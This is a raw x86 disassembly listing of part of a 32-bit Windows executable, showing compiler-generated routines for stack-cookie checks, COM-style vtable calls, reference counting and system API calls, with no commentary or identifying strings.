  404e75:	push   DWORD PTR [ebp+0xc]
  404e78:	mov    eax,DWORD PTR [ebp+0x8]
  404e7b:	add    eax,0x4
  404e7e:	push   eax
  404e7f:	call   DWORD PTR ds:0x408104
  404e85:	xor    eax,eax
  404e87:	pop    ebp
  404e88:	ret    0x8
  404e8b:	int3   
  404e8c:	int3   
  404e8d:	int3   
  404e8e:	int3   
  404e8f:	int3   
  404e90:	mov    edi,edi
  404e92:	push   ebp
  404e93:	mov    ebp,esp
  404e95:	push   ecx
  404e96:	mov    eax,ds:0x407004
  404e9b:	xor    eax,ebp
  404e9d:	mov    DWORD PTR [ebp-0x4],eax
  404ea0:	mov    edx,DWORD PTR [ebp+0x10]
  404ea3:	mov    eax,DWORD PTR [ebp+0x8]
  404ea6:	and    DWORD PTR [edx],0x0
  404ea9:	mov    ecx,DWORD PTR [eax+0x4]
  404eac:	test   ecx,ecx
  404eae:	je     0x404ec7
  404eb0:	mov    eax,DWORD PTR [ecx]
  404eb2:	push   esi
  404eb3:	push   edx
  404eb4:	push   DWORD PTR [ebp+0xc]
  404eb7:	mov    esi,DWORD PTR [eax]
  404eb9:	push   ecx
  404eba:	mov    ecx,esi
  404ebc:	call   DWORD PTR ds:0x4082f0
  404ec2:	call   esi
  404ec4:	pop    esi
  404ec5:	jmp    0x404ecc
  404ec7:	mov    eax,0x80004005
  404ecc:	mov    ecx,DWORD PTR [ebp-0x4]
  404ecf:	xor    ecx,ebp
  404ed1:	call   0x4063a0
  404ed6:	mov    esp,ebp
  404ed8:	pop    ebp
  404ed9:	ret    0xc
  404edc:	int3   
  404edd:	int3   
  404ede:	int3   
  404edf:	int3   
  404ee0:	int3   
  404ee1:	int3   
  404ee2:	int3   
  404ee3:	int3   
  404ee4:	int3   
  404ee5:	int3   
  404ee6:	int3   
  404ee7:	int3   
  404ee8:	int3   
  404ee9:	int3   
  404eea:	int3   
  404eeb:	int3   
  404eec:	int3   
  404eed:	int3   
  404eee:	int3   
  404eef:	int3   
  404ef0:	mov    edi,edi
  404ef2:	push   ebp
  404ef3:	mov    ebp,esp
  404ef5:	push   esi
  404ef6:	mov    esi,ecx
  404ef8:	lea    ecx,[esi+0x4]
  404efb:	mov    DWORD PTR [esi],0x401338
  404f01:	call   0x404b6d
  404f06:	test   BYTE PTR [ebp+0x8],0x1
  404f0a:	je     0x404f13
  404f0c:	push   esi
  404f0d:	call   0x406979
  404f12:	pop    ecx
  404f13:	mov    eax,esi
  404f15:	pop    esi
  404f16:	pop    ebp
  404f17:	ret    0x4
  404f1a:	int3   
  404f1b:	int3   
  404f1c:	int3   
  404f1d:	int3   
  404f1e:	int3   
  404f1f:	mov    edi,edi
  404f21:	push   ebp
  404f22:	mov    ebp,esp
  404f24:	push   DWORD PTR [ebp+0x8]
  404f27:	push   0x40
  404f29:	call   DWORD PTR ds:0x40806c
  404f2f:	mov    ecx,DWORD PTR [ebp+0xc]
  404f32:	mov    DWORD PTR [ecx],eax
  404f34:	neg    eax
  404f36:	sbb    eax,eax
  404f38:	and    eax,0x7ff8fff2
  404f3d:	add    eax,0x8007000e
  404f42:	pop    ebp
  404f43:	ret    0x8
  404f46:	int3   
  404f47:	int3   
  404f48:	int3   
  404f49:	int3   
  404f4a:	int3   
  404f4b:	int3   
  404f4c:	int3   
  404f4d:	int3   
  404f4e:	int3   
  404f4f:	int3   
  404f50:	mov    edi,edi
  404f52:	push   ebp
  404f53:	mov    ebp,esp
  404f55:	mov    ecx,DWORD PTR [ebp+0x8]
  404f58:	xor    eax,eax
  404f5a:	inc    eax
  404f5b:	lock xadd DWORD PTR [ecx+0x10],eax
  404f60:	inc    eax
  404f61:	pop    ebp
  404f62:	ret    0x4
  404f65:	int3   
  404f66:	int3   
  404f67:	int3   
  404f68:	int3   
  404f69:	int3   
  404f6a:	int3   
  404f6b:	int3   
  404f6c:	int3   
  404f6d:	int3   
  404f6e:	int3   
  404f6f:	int3   
  404f70:	mov    edi,edi
  404f72:	push   ebp
  404f73:	mov    ebp,esp
  404f75:	push   esi
  404f76:	mov    esi,DWORD PTR [ebp+0x8]
  404f79:	push   edi
  404f7a:	or     edi,0xffffffff
  404f7d:	lock xadd DWORD PTR [esi+0x10],edi
  404f82:	dec    edi
  404f83:	jne    0x404f97
  404f85:	test   esi,esi
  404f87:	je     0x404f97
  404f89:	mov    ecx,esi
  404f8b:	call   0x40500d
  404f90:	push   esi
  404f91:	call   0x406979
  404f96:	pop    ecx
  404f97:	mov    eax,edi
  404f99:	pop    edi
  404f9a:	pop    esi
  404f9b:	pop    ebp
  404f9c:	ret    0x4
  404f9f:	int3   
  404fa0:	int3   
  404fa1:	int3   
  404fa2:	int3   
  404fa3:	int3   
  404fa4:	mov    edi,edi
  404fa6:	push   ebp
  404fa7:	mov    ebp,esp
  404fa9:	push   esi
  404faa:	mov    esi,ecx
  404fac:	call   0x40500d
  404fb1:	test   BYTE PTR [ebp+0x8],0x1
  404fb5:	je     0x404fbe
  404fb7:	push   esi
  404fb8:	call   0x406979
  404fbd:	pop    ecx
  404fbe:	mov    eax,esi
  404fc0:	pop    esi
  404fc1:	pop    ebp
  404fc2:	ret    0x4
  404fc5:	int3   
  404fc6:	int3   
  404fc7:	int3   
  404fc8:	int3   
  404fc9:	int3   
  404fca:	mov    edi,edi
  404fcc:	push   ebp
  404fcd:	mov    ebp,esp
  404fcf:	and    DWORD PTR [ecx+0xc],0x0
  404fd3:	mov    eax,DWORD PTR [ebp+0x8]
  404fd6:	mov    DWORD PTR [ecx+0x8],0x401338
  404fdd:	mov    DWORD PTR [ecx],0x401328
  404fe3:	mov    DWORD PTR [ecx+0x4],0x401318
  404fea:	mov    DWORD PTR [ecx+0x8],0x401300
  404ff1:	mov    DWORD PTR [ecx+0x10],0x1
  404ff8:	mov    DWORD PTR [ecx+0x14],eax
  404ffb:	test   eax,eax
  404ffd:	je     0x405002
  404fff:	and    DWORD PTR [eax],0x0
  405002:	mov    eax,ecx
  405004:	pop    ebp
  405005:	ret    0x4
  405008:	int3   
  405009:	int3   
  40500a:	int3   
  40500b:	int3   
  40500c:	int3   
  40500d:	mov    DWORD PTR [ecx],0x401328
  405013:	mov    DWORD PTR [ecx+0x4],0x401318
  40501a:	mov    DWORD PTR [ecx+0x8],0x401300
  405021:	mov    DWORD PTR [ecx+0x8],0x401338
  405028:	add    ecx,0xc
  40502b:	jmp    0x404b6d
  405030:	int3   
  405031:	int3   
  405032:	int3   
  405033:	int3   
  405034:	int3   
  405035:	int3   
  405036:	int3   
  405037:	int3   
  405038:	int3   
  405039:	int3   
  40503a:	int3   
  40503b:	int3   
  40503c:	int3   
  40503d:	int3   
  40503e:	int3   
  40503f:	int3   
  405040:	mov    edi,edi
  405042:	push   ebp
  405043:	mov    ebp,esp
  405045:	push   ecx
  405046:	push   ecx
  405047:	mov    eax,ds:0x407004
  40504c:	xor    eax,ebp
  40504e:	mov    DWORD PTR [ebp-0x4],eax
  405051:	push   ebx
  405052:	push   esi
  405053:	push   edi
  405054:	mov    edi,DWORD PTR [ebp+0x8]
  405057:	lea    eax,[ebp-0x8]
  40505a:	push   eax
  40505b:	push   0x401bec
  405060:	push   0x401de0
  405065:	push   DWORD PTR [edi+0x8]
  405068:	call   DWORD PTR ds:0x4080f8
  40506e:	mov    ebx,DWORD PTR [ebp+0xc]
  405071:	test   eax,eax
  405073:	js     0x40509c
  405075:	mov    eax,DWORD PTR [ebp-0x8]
  405078:	push   ebx
  405079:	push   eax
  40507a:	mov    ecx,DWORD PTR [eax]
  40507c:	mov    esi,DWORD PTR [ecx+0xc]
  40507f:	mov    ecx,esi
  405081:	call   DWORD PTR ds:0x4082f0
  405087:	call   esi
  405089:	mov    eax,DWORD PTR [ebp-0x8]
  40508c:	push   eax
  40508d:	mov    ecx,DWORD PTR [eax]
  40508f:	mov    esi,DWORD PTR [ecx+0x8]
  405092:	mov    ecx,esi
  405094:	call   DWORD PTR ds:0x4082f0
  40509a:	call   esi
  40509c:	mov    eax,DWORD PTR [edi+0x10]
  40509f:	test   eax,eax
  4050a1:	je     0x4050cb
  4050a3:	cmp    DWORD PTR [eax],0x0
  4050a6:	je     0x4050b6
  4050a8:	push   DWORD PTR [eax]
  4050aa:	call   DWORD PTR ds:0x40807c
  4050b0:	mov    eax,DWORD PTR [edi+0x10]
  4050b3:	and    DWORD PTR [eax],0x0
  4050b6:	mov    eax,DWORD PTR [ebx]
  4050b8:	push   DWORD PTR [edi+0x10]
  4050bb:	push   ebx
  4050bc:	mov    esi,DWORD PTR [eax+0xc]
  4050bf:	mov    ecx,esi
  4050c1:	call   DWORD PTR ds:0x4082f0
  4050c7:	call   esi
  4050c9:	jmp    0x4050cd
  4050cb:	xor    eax,eax
  4050cd:	mov    ecx,DWORD PTR [ebp-0x4]
  4050d0:	pop    edi
  4050d1:	pop    esi
  4050d2:	xor    ecx,ebp
  4050d4:	pop    ebx
  4050d5:	call   0x4063a0
  4050da:	mov    esp,ebp
  4050dc:	pop    ebp
  4050dd:	ret    0x8
  4050e0:	int3   
  4050e1:	int3   
  4050e2:	int3   
  4050e3:	int3   
  4050e4:	int3   
  4050e5:	int3   
  4050e6:	int3   
  4050e7:	int3   
  4050e8:	int3   
  4050e9:	int3   
  4050ea:	int3   
  4050eb:	int3   
  4050ec:	int3   
  4050ed:	int3   
  4050ee:	int3   
  4050ef:	int3   
  4050f0:	mov    edi,edi
  4050f2:	push   ebp
  4050f3:	mov    ebp,esp
  4050f5:	push   DWORD PTR [ebp+0x10]
  4050f8:	push   DWORD PTR [ebp+0xc]
  4050fb:	push   0x401bac
  405100:	push   DWORD PTR [ebp+0x8]
  405103:	call   DWORD PTR ds:0x4080e0
  405109:	pop    ebp
  40510a:	ret    0xc
  40510d:	int3   
  40510e:	int3   
  40510f:	int3   
  405110:	int3   
  405111:	int3   
  405112:	int3   
  405113:	int3   
  405114:	int3   
  405115:	int3   
  405116:	int3   
  405117:	int3   
  405118:	int3   
  405119:	int3   
  40511a:	int3   
  40511b:	int3   
  40511c:	int3   
  40511d:	int3   
  40511e:	int3   
  40511f:	int3   
  405120:	mov    edi,edi
  405122:	push   ebp
  405123:	mov    ebp,esp
  405125:	push   ebx
  405126:	push   esi
  405127:	mov    esi,DWORD PTR [ebp+0x14]
  40512a:	xor    ecx,ecx
  40512c:	push   edi
  40512d:	mov    edi,DWORD PTR [ebp+0xc]
  405130:	mov    edx,0x80004005
  405135:	mov    ebx,0x401de0
  40513a:	mov    DWORD PTR [esi],ecx
  40513c:	mov    eax,DWORD PTR [edi+ecx*4]
  40513f:	cmp    eax,DWORD PTR [ebx+ecx*4]
  405142:	jne    0x405158
  405144:	inc    ecx
  405145:	cmp    ecx,0x4
  405148:	jne    0x40513c
  40514a:	push   esi
  40514b:	push   DWORD PTR [ebp+0x10]
  40514e:	push   DWORD PTR [ebp+0x8]
  405151:	call   0x4050f0
  405156:	jmp    0x40516f
  405158:	mov    eax,DWORD PTR [ebp+0x8]
  40515b:	cmp    DWORD PTR [eax+0xc],0x0
  40515f:	je     0x405171
  405161:	push   esi
  405162:	push   DWORD PTR [ebp+0x10]
  405165:	push   edi
  405166:	push   DWORD PTR [eax+0xc]
  405169:	call   DWORD PTR ds:0x4080f8
  40516f:	mov    edx,eax
  405171:	pop    edi
  405172:	pop    esi
  405173:	mov    eax,edx
  405175:	pop    ebx
  405176:	pop    ebp
  405177:	ret    0x10
  40517a:	int3   
  40517b:	int3   
  40517c:	int3   
  40517d:	int3   
  40517e:	int3   
  40517f:	mov    edi,edi
  405181:	push   ebp
  405182:	mov    ebp,esp
  405184:	sub    esp,0xc
  405187:	push   ebx
  405188:	push   esi
  405189:	push   edi
  40518a:	xor    edi,edi
  40518c:	mov    ebx,ecx
  40518e:	push   edi
  40518f:	push   edi
  405190:	push   edi
  405191:	push   edi
  405192:	push   0xffffffff
  405194:	push   DWORD PTR [ebx+0x2c]
  405197:	mov    eax,edx
  405199:	push   edi
  40519a:	push   edi
  40519b:	mov    DWORD PTR [ebp-0x8],eax
  40519e:	mov    DWORD PTR [eax],edi
  4051a0:	call   DWORD PTR ds:0x408220
  4051a6:	push   edi
  4051a7:	push   edi
  4051a8:	push   edi
  4051a9:	push   edi
  4051aa:	push   0xffffffff
  4051ac:	push   DWORD PTR [ebx+0x30]
  4051af:	mov    esi,eax
  4051b1:	push   edi
  4051b2:	push   edi
  4051b3:	mov    DWORD PTR [ebp-0x4],esi
  4051b6:	call   DWORD PTR ds:0x408220
  4051bc:	mov    DWORD PTR [ebp-0xc],eax
  4051bf:	lea    ecx,[eax+esi*1]
  4051c2:	cmp    ecx,esi
  4051c4:	jb     0x405217
  4051c6:	test   ecx,ecx
  4051c8:	je     0x40521c
  4051ca:	mov    esi,DWORD PTR [ebp-0x8]
  4051cd:	push   esi
  4051ce:	push   ecx
  4051cf:	call   0x404f1f
  4051d4:	mov    edi,eax
  4051d6:	test   edi,edi
  4051d8:	js     0x40521c
  4051da:	cmp    DWORD PTR [ebx+0x2c],0x0
  4051de:	mov    esi,DWORD PTR [esi]
  4051e0:	je     0x4051f3
  4051e2:	push   DWORD PTR [ebp-0x4]
  4051e5:	push   esi
  4051e6:	push   DWORD PTR [ebx+0x2c]
  4051e9:	call   DWORD PTR ds:0x4080d8
  4051ef:	mov    eax,esi
  4051f1:	jmp    0x4051f5
  4051f3:	xor    eax,eax
  4051f5:	add    esi,DWORD PTR [ebp-0x4]
  4051f8:	cmp    DWORD PTR [ebx+0x30],0x0
  4051fc:	mov    DWORD PTR [ebx+0x10],eax
  4051ff:	je     0x405210
  405201:	push   DWORD PTR [ebp-0xc]
  405204:	push   esi
  405205:	push   DWORD PTR [ebx+0x30]
  405208:	call   DWORD PTR ds:0x4080d8
  40520e:	jmp    0x405212
  405210:	xor    esi,esi
  405212:	mov    DWORD PTR [ebx+0x14],esi
  405215:	jmp    0x40521c
  405217:	mov    edi,0x80070216
  40521c:	mov    eax,edi
  40521e:	pop    edi
  40521f:	pop    esi
  405220:	pop    ebx
  405221:	mov    esp,ebp
  405223:	pop    ebp
  405224:	ret    
  405225:	int3   
  405226:	int3   
  405227:	int3   
  405228:	int3   
  405229:	int3   
  40522a:	mov    edi,edi
  40522c:	push   ebp
  40522d:	mov    ebp,esp
  40522f:	sub    esp,0x1fc
  405235:	mov    eax,ds:0x407004
  40523a:	xor    eax,ebp
  40523c:	mov    DWORD PTR [ebp-0x4],eax
  40523f:	mov    eax,DWORD PTR [ebp+0x8]
  405242:	push   ebx
  405243:	mov    ebx,DWORD PTR [ebp+0x1c]
  405246:	push   esi
  405247:	mov    esi,DWORD PTR [ebp+0x18]
  40524a:	push   edi
  40524b:	mov    DWORD PTR [ebp-0x1b0],eax
  405251:	lea    eax,[ebp-0x1b8]
  405257:	push   eax
  405258:	push   0x70c58008
  40525d:	lea    eax,[ebp-0x1a8]
  405263:	mov    DWORD PTR [ebp-0x1ac],edx
  405269:	push   eax
  40526a:	push   0x0
  40526c:	push   ecx
  40526d:	mov    DWORD PTR [ebp-0x1b4],ecx
  405273:	call   DWORD PTR ds:0x4080c0
  405279:	mov    edi,eax
  40527b:	test   edi,edi
  40527d:	js     0x4054b1
  405283:	lea    eax,[ebp-0x19c]
  405289:	push   eax
  40528a:	push   ecx
  40528b:	mov    ecx,DWORD PTR [ebp-0x1a8]
  405291:	call   0x405f95
  405296:	mov    edi,eax
  405298:	test   edi,edi
  40529a:	js     0x4054a5
  4052a0:	call   DWORD PTR ds:0x408128
  4052a6:	mov    DWORD PTR [ebp-0x1a0],eax
  4052ac:	test   eax,eax
  4052ae:	je     0x40548f
  4052b4:	xor    edi,edi
  4052b6:	lea    eax,[ebp-0x1f4]
  4052bc:	push   0x3c
  4052be:	push   edi
  4052bf:	push   eax
  4052c0:	mov    DWORD PTR [ebp-0x1a4],edi
  4052c6:	call   0x406aee
  4052cb:	mov    eax,DWORD PTR [ebp+0xc]
  4052ce:	lea    edx,[ebp-0x1a4]
  4052d4:	mov    DWORD PTR [ebp-0x1e0],eax
  4052da:	lea    ecx,[ebp-0x1f8]
  4052e0:	mov    eax,DWORD PTR [ebp-0x1ac]
  4052e6:	add    esp,0xc
  4052e9:	mov    DWORD PTR [ebp-0x1cc],eax
  4052ef:	mov    eax,DWORD PTR [ebp-0x1b0]
  4052f5:	mov    DWORD PTR [ebp-0x1f8],0x40
  4052ff:	mov    DWORD PTR [ebp-0x1f4],0x4500
  405309:	mov    DWORD PTR [ebp-0x1c8],eax
  40530f:	mov    DWORD PTR [ebp-0x1f0],edi
  405315:	call   0x40517f
  40531a:	mov    edi,eax
  40531c:	test   edi,edi
  40531e:	js     0x405483
  405324:	push   0x401e00
  405329:	push   0x18
  40532b:	call   0x406983
  405330:	pop    ecx
  405331:	pop    ecx
  405332:	test   eax,eax
  405334:	je     0x405342
  405336:	push   ebx
  405337:	mov    ecx,eax
  405339:	call   0x404fca
  40533e:	mov    ebx,eax
  405340:	jmp    0x405344
  405342:	xor    ebx,ebx
  405344:	push   esi
  405345:	test   ebx,ebx
  405347:	je     0x405354
  405349:	lea    eax,[ebx+0xc]
  40534c:	push   eax
  40534d:	call   DWORD PTR ds:0x408104
  405353:	push   ebx
  405354:	push   DWORD PTR [ebp-0x19c]
  40535a:	call   DWORD PTR ds:0x4080d4
  405360:	mov    eax,DWORD PTR [ebp-0x19c]
  405366:	push   0x1
  405368:	push   0x7fff
  40536d:	push   0x1
  40536f:	mov    esi,DWORD PTR [eax]
  405371:	push   0x0
  405373:	push   DWORD PTR [ebp-0x1a0]
  405379:	mov    ecx,DWORD PTR [esi+0xc]
  40537c:	push   eax
  40537d:	call   DWORD PTR ds:0x4082f0
  405383:	call   DWORD PTR [esi+0xc]
  405386:	mov    edi,eax
  405388:	xor    esi,esi
  40538a:	test   edi,edi
  40538c:	js     0x40544c
  405392:	push   esi
  405393:	push   esi
  405394:	push   DWORD PTR [ebp-0x1a0]
  40539a:	call   DWORD PTR ds:0x408124
  4053a0:	test   eax,eax
  4053a2:	je     0x405447
  4053a8:	dec    eax
  4053a9:	lea    edx,[ebp-0x1f8]
  4053af:	movzx  eax,ax
  4053b2:	mov    DWORD PTR [ebp-0x1ec],eax
  4053b8:	mov    eax,DWORD PTR [ebp-0x19c]
  4053be:	push   edx
  4053bf:	push   eax
  4053c0:	mov    ecx,DWORD PTR [eax]
  4053c2:	mov    esi,DWORD PTR [ecx+0x10]
  4053c5:	mov    ecx,esi
  4053c7:	call   DWORD PTR ds:0x4082f0
  4053cd:	call   esi
  4053cf:	xor    esi,esi
  4053d1:	mov    edi,eax
  4053d3:	push   0x188
  4053d8:	lea    eax,[ebp-0x194]
  4053de:	mov    DWORD PTR [ebp-0x198],esi
  4053e4:	push   esi
  4053e5:	push   eax
  4053e6:	call   0x406aee
  4053eb:	add    esp,0xc
  4053ee:	push   DWORD PTR [ebp-0x1b4]
  4053f4:	call   DWORD PTR ds:0x4080e4
  4053fa:	mov    edx,eax
  4053fc:	lea    ecx,[ebp-0x198]
  405402:	call   0x40412b
  405407:	xor    eax,eax
  405409:	mov    DWORD PTR [ebp-0x8c],esi
  40540f:	cmp    edi,0x800702e4
  405415:	mov    edx,0x74d
  40541a:	push   0x3
  40541c:	sete   al
  40541f:	mov    ecx,0x401198
  405424:	mov    DWORD PTR [ebp-0x110],eax
  40542a:	xor    eax,eax
  40542c:	inc    eax
  40542d:	mov    DWORD PTR [ebp-0x114],eax
  405433:	mov    DWORD PTR [ebp-0x90],eax
  405439:	lea    eax,[ebp-0x198]
  40543f:	push   eax
  405440:	call   0x404170
  405445:	jmp    0x40544c
  405447:	mov    edi,0x8000ffff
  40544c:	push   esi
  40544d:	push   DWORD PTR [ebp-0x19c]
  405453:	call   DWORD PTR ds:0x4080d4
  405459:	test   ebx,ebx
  40545b:	je     0x40546e
  40545d:	push   esi
  40545e:	lea    eax,[ebx+0xc]
  405461:	push   eax
  405462:	call   DWORD PTR ds:0x408104
  405468:	push   ebx
  405469:	call   0x404f70
  40546e:	cmp    DWORD PTR [ebp-0x1a4],0x0
  405475:	je     0x405483
  405477:	push   DWORD PTR [ebp-0x1a4]
  40547d:	call   DWORD PTR ds:0x408070
  405483:	push   DWORD PTR [ebp-0x1a0]
  405489:	call   DWORD PTR ds:0x408120
  40548f:	mov    eax,DWORD PTR [ebp-0x19c]
  405495:	push   eax
  405496:	mov    ecx,DWORD PTR [eax]
  405498:	mov    esi,DWORD PTR [ecx+0x8]
  40549b:	mov    ecx,esi
  40549d:	call   DWORD PTR ds:0x4082f0
  4054a3:	call   esi
  4054a5:	push   DWORD PTR [ebp-0x1a8]
  4054ab:	call   DWORD PTR ds:0x4080c8
  4054b1:	mov    ecx,DWORD PTR [ebp-0x4]
  4054b4:	mov    eax,edi
  4054b6:	pop    edi
  4054b7:	pop    esi
  4054b8:	xor    ecx,ebp
  4054ba:	pop    ebx
  4054bb:	call   0x4063a0
  4054c0:	mov    esp,ebp
  4054c2:	pop    ebp
  4054c3:	ret    0x18
  4054c6:	int3   
  4054c7:	int3   
  4054c8:	int3   
  4054c9:	int3   
  4054ca:	int3   
  4054cb:	int3   
  4054cc:	int3   
  4054cd:	int3   
  4054ce:	int3   
  4054cf:	int3   
  4054d0:	sub    DWORD PTR [esp+0x4],0x4
  4054d5:	jmp    0x404f70
  4054da:	int3   
  4054db:	int3   
  4054dc:	int3   
  4054dd:	int3   
  4054de:	int3   
  4054df:	int3   
  4054e0:	sub    DWORD PTR [esp+0x4],0x8
  4054e5:	jmp    0x404f70
  4054ea:	int3   
  4054eb:	int3   
  4054ec:	int3   
  4054ed:	int3   
  4054ee:	int3   
  4054ef:	int3   
  4054f0:	sub    ecx,0x8
  4054f3:	jmp    0x404fa4
  4054f8:	int3   
  4054f9:	int3   
  4054fa:	int3   
  4054fb:	int3   
  4054fc:	int3   
  4054fd:	int3   
  4054fe:	int3   
  4054ff:	int3   
  405500:	sub    DWORD PTR [esp+0x4],0x4
  405505:	jmp    0x404f50
  40550a:	int3   
  40550b:	int3   
  40550c:	int3   
  40550d:	int3   
  40550e:	int3   
  40550f:	int3   
  405510:	sub    DWORD PTR [esp+0x4],0x8
  405515:	jmp    0x404f50
  40551a:	int3   
  40551b:	int3   
  40551c:	int3   
  40551d:	int3   
  40551e:	int3   
  40551f:	int3   
  405520:	sub    DWORD PTR [esp+0x4],0x4
  405525:	jmp    0x4050f0
  40552a:	int3   
  40552b:	int3   
  40552c:	int3   
  40552d:	int3   
  40552e:	int3   
  40552f:	int3   
  405530:	sub    DWORD PTR [esp+0x4],0x8
  405535:	jmp    0x4050f0
  40553a:	int3   
  40553b:	int3   
  40553c:	int3   
  40553d:	int3   
  40553e:	int3   
  40553f:	mov    edi,edi
  405541:	push   ebp
  405542:	mov    ebp,esp
  405544:	push   ecx
  405545:	push   esi
  405546:	mov    esi,ecx
  405548:	push   edi
  405549:	cmp    DWORD PTR [esi],0x2
  40554c:	jbe    0x405556
  40554e:	push   DWORD PTR [esi]
  405550:	call   DWORD PTR ds:0x408008
  405556:	and    DWORD PTR [esi],0x0
  405559:	cmp    DWORD PTR [esi+0x4],0x0
  40555d:	je     0x40556d
  40555f:	xor    eax,eax
  405561:	cmp    DWORD PTR [esi+0x4],0x1
  405565:	setne  al
  405568:	inc    eax
  405569:	mov    DWORD PTR [esi],eax
  40556b:	jmp    0x4055af
  40556d:	lea    eax,[ebp-0x4]
  405570:	mov    edi,0x101
  405575:	push   eax
  405576:	push   edi
  405577:	push   0x0
  405579:	push   0x401c00
  40557e:	push   DWORD PTR [ebp+0x8]
  405581:	call   DWORD PTR ds:0x408000
  405587:	test   eax,eax
  405589:	jne    0x4055a9
  40558b:	push   esi
  40558c:	push   edi
  40558d:	push   eax
  40558e:	push   DWORD PTR [ebp+0xc]
  405591:	push   DWORD PTR [ebp-0x4]
  405594:	call   DWORD PTR ds:0x408000
  40559a:	push   DWORD PTR [ebp-0x4]
  40559d:	mov    edi,eax
  40559f:	call   DWORD PTR ds:0x408008
  4055a5:	test   edi,edi
  4055a7:	je     0x4055b1
  4055a9:	mov    DWORD PTR [esi],0x1
  4055af:	xor    edi,edi
  4055b1:	mov    eax,edi
  4055b3:	pop    edi
  4055b4:	pop    esi
  4055b5:	mov    esp,ebp
  4055b7:	pop    ebp
  4055b8:	ret    0xc
  4055bb:	int3   
  4055bc:	int3   
  4055bd:	int3   
  4055be:	int3   
  4055bf:	int3   
  4055c0:	mov    edi,edi
  4055c2:	push   ebp
  4055c3:	mov    ebp,esp
  4055c5:	sub    esp,0xc
  4055c8:	push   ebx
  4055c9:	push   esi
  4055ca:	mov    esi,DWORD PTR [ebp+0xc]
  4055cd:	xor    eax,eax
  4055cf:	push   edi
  4055d0:	mov    edi,esi
  4055d2:	mov    DWORD PTR [ebp-0x8],ecx
  4055d5:	stos   DWORD PTR es:[edi],eax
  4055d6:	stos   DWORD PTR es:[edi],eax
  4055d7:	stos   DWORD PTR es:[edi],eax
  4055d8:	cmp    DWORD PTR [ecx],0x0
  4055db:	jne    0x4055e5
  4055dd:	push   0x15
  4055df:	pop    ebx
  4055e0:	jmp    0x40569b
  4055e5:	cmp    DWORD PTR [ecx],0x1
  4055e8:	jne    0x4055ff
  4055ea:	cmp    DWORD PTR [ecx+0x4],0x1
  4055ee:	jne    0x4055f7
  4055f0:	xor    ebx,ebx
  4055f2:	jmp    0x40569b
  4055f7:	push   0x2
  4055f9:	pop    ebx
  4055fa:	jmp    0x4056a1
  4055ff:	cmp    DWORD PTR [ecx],0x2
  405602:	jne    0x405611
  405604:	mov    DWORD PTR [esi],0x3
  40560a:	xor    ebx,ebx
  40560c:	jmp    0x4056a1
  405611:	lea    eax,[ebp-0x4]
  405614:	mov    DWORD PTR [ebp-0x4],0xc
  40561b:	push   eax
  40561c:	push   esi
  40561d:	xor    edi,edi
  40561f:	push   edi
  405620:	push   0x20000008
  405625:	push   DWORD PTR [ebp+0x8]
  405628:	push   edi
  405629:	push   DWORD PTR [ecx]
  40562b:	call   DWORD PTR ds:0x408210
  405631:	mov    ebx,eax
  405633:	cmp    ebx,0xea
  405639:	jne    0x40568a
  40563b:	push   DWORD PTR [ebp-0x4]
  40563e:	push   edi
  40563f:	call   DWORD PTR ds:0x40806c
  405645:	mov    edi,eax
  405647:	mov    DWORD PTR [ebp-0xc],edi
  40564a:	test   edi,edi
  40564c:	je     0x405687
  40564e:	lea    eax,[ebp-0x4]
  405651:	push   eax
  405652:	mov    eax,DWORD PTR [ebp-0x8]
  405655:	push   edi
  405656:	push   0x0
  405658:	push   0x20000008
  40565d:	push   DWORD PTR [ebp+0x8]
  405660:	push   0x0
  405662:	push   DWORD PTR [eax]
  405664:	call   DWORD PTR ds:0x408210
  40566a:	mov    ebx,eax
  40566c:	test   ebx,ebx
  40566e:	jne    0x40567e
  405670:	mov    esi,edi
  405672:	mov    edi,DWORD PTR [ebp+0xc]
  405675:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405676:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405677:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405678:	mov    esi,DWORD PTR [ebp+0xc]
  40567b:	mov    edi,DWORD PTR [ebp-0xc]
  40567e:	push   edi
  40567f:	call   DWORD PTR ds:0x408070
  405685:	jmp    0x40568a
  405687:	push   0xe
  405689:	pop    ebx
  40568a:	test   ebx,ebx
  40568c:	je     0x4056a1
  40568e:	cmp    ebx,0x2
  405691:	je     0x4056a1
  405693:	cmp    ebx,0x65e
  405699:	je     0x4056a1
  40569b:	mov    DWORD PTR [esi],0x2
  4056a1:	pop    edi
  4056a2:	pop    esi
  4056a3:	mov    eax,ebx
  4056a5:	pop    ebx
  4056a6:	mov    esp,ebp
  4056a8:	pop    ebp
  4056a9:	ret    0x8
  4056ac:	int3   
  4056ad:	int3   
  4056ae:	int3   
  4056af:	int3   
  4056b0:	int3   
  4056b1:	int3   
  4056b2:	int3   
  4056b3:	int3   
  4056b4:	int3   
  4056b5:	int3   
  4056b6:	int3   
  4056b7:	int3   
  4056b8:	int3   
  4056b9:	int3   
  4056ba:	int3   
  4056bb:	int3   
  4056bc:	int3   
  4056bd:	int3   
  4056be:	int3   
  4056bf:	int3   
  4056c0:	mov    edi,edi
  4056c2:	push   ebp
  4056c3:	mov    ebp,esp
  4056c5:	mov    ecx,DWORD PTR [ebp+0x8]
  4056c8:	push   esi
  4056c9:	or     esi,0xffffffff
  4056cc:	lock xadd DWORD PTR [ecx+0x10],esi
  4056d1:	dec    esi
  4056d2:	jne    0x4056df
  4056d4:	test   ecx,ecx
  4056d6:	je     0x4056df
  4056d8:	push   0x1
  4056da:	call   0x4056eb
  4056df:	mov    eax,esi
  4056e1:	pop    esi
  4056e2:	pop    ebp
  4056e3:	ret    0x4
  4056e6:	int3   
  4056e7:	int3   
  4056e8:	int3   
  4056e9:	int3   
  4056ea:	int3   
  4056eb:	mov    edi,edi
  4056ed:	push   ebp
  4056ee:	mov    ebp,esp
  4056f0:	push   esi
  4056f1:	mov    esi,ecx
  4056f3:	mov    DWORD PTR [esi],0x401380
  4056f9:	mov    DWORD PTR [esi+0x4],0x401368
  405700:	mov    DWORD PTR [esi+0x8],0x401350
  405707:	cmp    DWORD PTR [esi+0x24],0x2
  40570b:	jbe    0x405716
  40570d:	push   DWORD PTR [esi+0x24]
  405710:	call   DWORD PTR ds:0x408008
  405716:	and    DWORD PTR [esi+0x24],0x0
  40571a:	lea    ecx,[esi+0xc]
  40571d:	mov    DWORD PTR [esi+0x8],0x401338
  405724:	call   0x404b6d
  405729:	test   BYTE PTR [ebp+0x8],0x1
  40572d:	je     0x405736
  40572f:	push   esi
  405730:	call   0x406979
  405735:	pop    ecx
  405736:	mov    eax,esi
  405738:	pop    esi
